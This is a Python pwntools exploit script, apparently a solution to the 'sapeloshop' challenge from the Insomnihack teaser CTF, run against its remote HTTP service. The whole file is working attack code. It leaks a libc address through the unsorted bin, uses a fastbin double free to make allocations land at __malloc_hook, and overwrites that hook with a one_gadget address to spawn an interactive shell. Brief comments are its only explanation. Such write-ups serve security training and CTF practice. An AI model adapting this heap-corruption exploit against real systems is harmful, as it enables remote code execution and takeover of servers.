from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

file = "./sapeloshop"

bin = ELF(file)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("libc-2.23.so")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc-2.23.so.")}

conn = remote("sapeloshop.teaser.insomnihack.ch", 80)
#conn = process(file, env=env)
#gdb.attach(conn)

def html(url, content):
    r = ""
    if content is None:
        r += "GET"
    else:
        r += "POST"
    r += " /" + url + " HTTP/1.1\r\n"
    r += "Connection: keep-alive\r\n"
    if content is not None:
        r += "Content-Length: " + str(len(content)) + "\r\n"
    r += "\r\n"
    if content is not None:
        r += content
    return r

def parse(num):
    """Returns the item contents depending on num items"""
    conn.recvuntil("Content-Length")
    conn.recvuntil("\r\n\r\n")
    items = []
    for i in range(num):
        conn.recvuntil("class=\"row\"><div class=\"col-md-8\"><img src=\"img/")
        item = conn.recvuntil("\"")[:-1]
        items.append(item)
    conn.recvuntil("Jackie Stewart.") # Footer
    return items

def add(desc, num=0, shell=False):
    conn.send(html("add", "desc=" + desc + "&"))
    if shell:
        return
    return parse(num)

def inc(item, num=0):
    conn.send(html("inc", "item=" + str(item) + "&"))
    return parse(num)

def sub(item, num=0):
    conn.send(html("sub", "item=" + str(item) + "&"))
    return parse(num)

def d(item, num=0):
    conn.send(html("del", "item=" + str(item) + "&"))
    return parse(num)

# Libc leaking through unsorted bin
add("a"*0x100)
add("b"*0x40)
sub(0) # Goes into unsorted bin
items = inc(0, 2) # Increasing count so it prints

# To prevent cases where libc leak is incomplete
assert(len(items[0]) == 6)

libc_leak = u64(items[0] + "\x00\x00")
#libc.address = libc_leak - 0x7f12f6391b78 + 0x7f12f5fcd000
libc.address = libc_leak - 0x7f25a1ecdb78 + 0x7f25a1b09000

d(1) # Clearing heap

# Fastbin corruption
add("c"*0x60) # a = malloc(0x60)
add("d"*0x60) # b = malloc(0x60)
sub(0)
sub(0) # free(a)
sub(1) # free(b)
inc(0)
sub(0) # free(a)

payload = p64(libc.symbols['__malloc_hook'] - 0x23)[:6]
payload += "%00"*((0x60 - len(payload))/3)

add(payload)
add("e"*0x60)
add("f"*0x60)

one_gadget_addr = libc.address + 0xf02a4
payload = "g"*0x13 + p64(one_gadget_addr)[:6]
payload += "%00"*((0x60 - len(payload))/3)
add(payload)
add("h"*0x50, shell=True)

log.info(hex(libc_leak))

conn.interactive()
